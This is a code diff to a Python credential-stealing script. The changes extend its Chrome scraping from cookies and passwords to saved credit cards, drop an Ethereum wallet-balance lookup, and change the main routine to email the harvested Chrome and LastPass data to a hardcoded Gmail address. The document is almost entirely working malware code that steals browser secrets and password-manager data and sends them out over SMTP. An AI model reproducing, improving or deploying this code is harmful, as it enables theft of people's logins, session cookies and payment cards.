@@ -8,9 +8,9 @@ import sqlite3
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-from web3 import Web3
 import subprocess
 import time
+import browser_cookie3
 
 # Global encryption key
 key = os.urandom(32)  # Use a securely stored key in production
@@ -29,7 +29,7 @@ def decrypt_data(encrypted_data):
     decrypted_data = unpad(cipher.decrypt(encrypted_data[AES.block_size:]), AES.block_size)
     return decrypted_data.decode('utf-8')
 
-# Function to scrape Chrome data (cookies and passwords)
+# Function to scrape Chrome data (cookies, passwords, and credit cards)
 def scrape_chrome_data():
     cookies = []
     try:
@@ -54,8 +54,21 @@ def scrape_chrome_data():
     except Exception as e:
         passwords_data = f"Error fetching passwords: {str(e)}"
     
-    # Combine cookies and passwords data
-    data = f"Cookies:\n{cookies_data}\nPasswords:\n{passwords_data}"
+    # Retrieve credit card data from Chrome
+    try:
+        credit_card_db = os.path.expanduser("~/.config/google-chrome/Default/Web Data")
+        connection = sqlite3.connect(credit_card_db)
+        cursor = connection.cursor()
+        cursor.execute("SELECT name, value FROM credit_cards")
+        credit_cards = []
+        for row in cursor.fetchall():
+            credit_cards.append(f"Card Name: {row[0]}, Card Value: {row[1]}")
+        credit_card_data = "\n".join(credit_cards)  # Join card data into a string
+    except Exception as e:
+        credit_card_data = f"Error fetching credit card data: {str(e)}"
+    
+    # Combine cookies, passwords, and credit card data
+    data = f"Cookies:\n{cookies_data}\nPasswords:\n{passwords_data}\nCredit Cards:\n{credit_card_data}"
     encrypted_data = encrypt_data(data)
     
     with open("chrome_scraped_data.txt", "w") as file:
@@ -98,44 +111,6 @@ def scrape_lastpass_data():
     except Exception as e:
         print(f"Error scraping LastPass: {str(e)}")
 
-# Function to scrape public cryptocurrency wallet data (using Web3.py)
-def scrape_crypto_data(wallet_address):
-    # Connect to Ethereum network using Web3 (Infura or other providers can be used)
-    infura_url = 'https://mainnet.infura.io/v3/b6510ed5848a45acb5613ee5d755bf4a'  # Replace with your Infura project ID
-    web3 = Web3(Web3.HTTPProvider(infura_url))
-
-    # Check if connected to Ethereum network
-    if not web3.isConnected():
-        raise Exception("Failed to connect to Ethereum network")
-
-    # Fetch wallet balance
-    balance_wei = web3.eth.get_balance(wallet_address)  # Balance in wei
-    balance_eth = web3.fromWei(balance_wei, 'ether')  # Convert to Ether
-
-    # Fetch ERC20 token holdings (for example, USDT)
-    usdt_contract_address = '0xdac17f958d2ee523a2206206994597c13d831ec7'  # USDT token contract address on Ethereum
-    usdt_contract = web3.eth.contract(address=usdt_contract_address, abi=[
-        {
-            "constant": True,
-            "inputs": [{"name": "_owner", "type": "address"}],
-            "name": "balanceOf",
-            "outputs": [{"name": "balance", "type": "uint256"}],
-            "payable": False,
-            "stateMutability": "view",
-            "type": "function"
-        }
-    ])
-    usdt_balance = usdt_contract.functions.balanceOf(wallet_address).call()  # Fetch token balance
-    usdt_balance = web3.fromWei(usdt_balance, 'mwei')  # USDT has 6 decimals
-
-    # Prepare data to encrypt
-    data = f"Wallet Address: {wallet_address}\nBalance: {balance_eth} ETH\nUSDT Balance: {usdt_balance} USDT"
-    encrypted_data = encrypt_data(data)
-
-    # Save the encrypted data to a file
-    with open("crypto_scraped_data.txt", "w") as file:
-        file.write(encrypted_data)
-
 # Function to send email with the scraped data
 def send_email(file_path, recipient_email, data):
     sender_email = "cardonewhite081@gmail.com"
@@ -144,7 +119,7 @@ def send_email(file_path, recipient_email, data):
     message = MIMEMultipart()
     message["From"] = sender_email
     message["To"] = recipient_email
-    message["Subject"] = "Scraped Wallet Data"
+    message["Subject"] = "Scraped Data"
     message.attach(MIMEText(data, "plain"))
 
     # Send the email
@@ -155,17 +130,22 @@ def send_email(file_path, recipient_email, data):
 
 # Main function to scrape data and send email
 def main():
-    # Example wallet address (replace with real address for testing)
-    wallet_address = '0xYourWalletAddressHere'
+    # Scrape Chrome data (cookies, passwords, credit cards)
+    scrape_chrome_data()
 
-    # Scrape wallet data
-    scrape_crypto_data(wallet_address)
+    # Scrape LastPass data (passwords)
+    scrape_lastpass_data()
 
     # Sending email with the decrypted content of the scraped data
-    with open("crypto_scraped_data.txt", "r") as file:
+    with open("chrome_scraped_data.txt", "r") as file:
         encrypted_data = file.read()
     decrypted_data = decrypt_data(encrypted_data)
-    send_email("crypto_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
+    send_email("chrome_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
+
+    with open("lastpass_scraped_data.txt", "r") as file:
+        encrypted_data = file.read()
+    decrypted_data = decrypt_data(encrypted_data)
+    send_email("lastpass_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
 
 # Flask route to run the script
 app = Flask(__name__)
